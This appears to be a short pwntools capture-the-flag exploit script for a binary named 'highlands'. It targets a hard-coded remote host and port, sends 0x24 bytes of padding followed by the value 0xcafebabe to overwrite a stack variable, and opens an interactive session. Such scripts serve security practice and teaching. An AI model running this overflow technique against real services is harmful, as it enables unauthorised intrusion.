#!/usr/bin/env python3

from pwn import *

# ENV
PORT =  9000
HOST = "61.14.233.78"
exe = context.binary = ELF('./highlands', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
        	b*0x080492cd
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()
input()
pl = flat(
	b'A'*0x24,
	0xcafebabe
	)

p.sendlineafter(b"inspired!", pl)

p.interactive()
